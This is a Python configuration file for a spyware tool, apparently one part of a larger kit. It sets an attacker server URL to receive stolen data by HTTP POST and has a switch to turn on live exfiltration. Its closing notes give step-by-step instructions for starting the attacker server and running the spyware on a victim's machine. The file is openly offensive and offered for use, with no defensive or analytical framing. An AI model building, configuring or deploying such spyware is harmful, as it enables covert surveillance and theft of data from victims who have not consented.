"""
Configuration file for spyware data exfiltration
Edit these settings to match your attacker server setup
"""

# ============================================================================
# ATTACKER SERVER CONFIGURATION
# ============================================================================

# Set to your attacker machine's IP address and port
# Example: "http://192.168.1.100:5000/receive"
ATTACKER_URL = "http://192.168.0.117:5000/receive"  # Your IP address

# Enable real exfiltration (requires 'requests' library installed)
USE_REAL_EXFILTRATION = False  # Testing locally first (no server needed)

# ============================================================================
# NOTES:
# ============================================================================
# 1. Install requests: pip install requests
# 2. Start attacker_server.py on attacker machine
# 3. Change ATTACKER_URL to your attacker machine's IP
# 4. Set USE_REAL_EXFILTRATION = True
# 5. Run spyware on victim machine - data will be sent via HTTP POST
